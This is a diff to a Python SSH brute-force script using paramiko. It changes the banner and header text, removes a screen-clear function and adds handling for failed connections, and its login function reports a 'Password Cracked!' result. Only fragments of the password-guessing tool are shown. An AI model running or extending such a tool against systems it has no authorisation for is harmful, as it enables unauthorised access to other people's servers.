@@ -2,9 +2,10 @@
 # -*- coding: utf-8 -*-
 """
 Coded by parsa kazazi
-@parsa_kazazi (Github, Twitter)
+GitHub: https://github.com/parsa-kazazi
+Twitter: https://twitter.com/parsa_kazazi
 
-Quick and easy SSH Brute Force python3 script
+SSH Brute Force Attack python3 script
 Works on all operating systems
 For legal activities only
 Version: 1.0
@@ -17,19 +18,12 @@ import time
 
 os_name = os.name
 
-def clear():
-    if (os_name == "nt"):
-        os.system("cls")
-    else:
-        os.system("clear")
-
 try:
     import paramiko
 except:
-    print("\nParamiko package not installed.\nTry: pip install paramiko\n")
+    print("\nparamiko package not installed.\nTry: pip install paramiko\n")
     exit()
 
-clear()
 if (os_name == "nt"):
     os.system("@echo off")
     os.system("title SSH Brute")
@@ -37,12 +31,12 @@ else:
     os.system("printf '\033]2;SSH Brute\a'")
 
 print("""
-  ___   ___   _  _         ___   ___   _   _   _____   ___
- / __| / __| | || |  ___  | _ ) | _ \ | | | | |_   _| | __|
- \__ \ \__ \ | __ | |___| | _ \ |   / | |_| |   | |   | _|
- |___/ |___/ |_||_|       |___/ |_|_\  \___/    |_|   |___|
+  ___ ___ _  _         ___          _       
+ / __/ __| || |  ___  | _ )_ _ _  _| |_ ___ 
+ \__ \__ \ __ | |___| | _ \ '_| || |  _/ -_)
+ |___/___/_||_|       |___/_|  \_,_|\__\___|
 
- SSH (Secure Shell) Brute Force Attack. Quick and easy
+ SSH (Secure Shell) Brute Force Attack. version 1.0
 
 """)
 
@@ -94,6 +88,8 @@ def login(ip_address, username, password):
         print(error + "Host: " + hostname + " is timed out")
     except paramiko.ssh_exception.SSHException:
         print(error + "Error reading SSH protocol banner")
+    except paramiko.ssh_exception.NoValidConnectionsError:
+        print(error + "Unable to connect to port 22 on " + hostname)
     else:
         print("\n" + good + "Password Cracked!")
         print(good + target + " password: " + password + "\n")
